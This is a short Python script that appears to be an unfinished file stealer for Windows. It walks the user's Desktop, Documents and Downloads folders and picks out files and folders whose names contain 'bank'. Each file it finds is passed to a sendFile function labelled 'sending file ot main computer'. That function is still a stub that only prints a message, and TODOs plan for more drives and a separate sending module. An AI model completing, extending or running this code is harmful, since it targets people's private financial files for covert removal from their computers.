import os

folders = ["Desktop", "Documents", "Downloads"]    

# TODO: Consider system with multiple drives
folderPathList = [os.path.join(os.environ['USERPROFILE'], x) for x in folders]

# look for "bank" within file/folder names
def getFilesAndDirsInPath(path, filterWithBank):
    if not filterWithBank:
        fileandDirList = [f for f in os.listdir(path)]
    else:
        fileandDirList = [f for f in os.listdir(path) if "bank" in f.lower()]
    print(fileandDirList)
    return fileandDirList

def sendFile(file):         #TODO : remove and make its own module/class
    print("sending file ot main computer")

def handleFilesAndDirs(folderPathList, curDepth = 0, maxDepth = 3):
    for path in folderPathList:
        isZeroDepth = curDepth==0
        fileAndDirList = getFilesAndDirsInPath(path, isZeroDepth)
        for fileOrDir in fileAndDirList:
            if os.path.isfile(path+"\\"+fileOrDir):
                file = fileOrDir
                sendFile(file)
            elif os.path.isdir(path+"\\"+fileOrDir):
                if curDepth >= maxDepth:
                    return
                folder = fileOrDir
                handleFilesAndDirs([path+"\\"+folder], curDepth+1)
                
            else:
                print("weird file format (else statemnt)")

handleFilesAndDirs(folderPathList)



# test code
# getFilesInPath(os.path.abspath(""))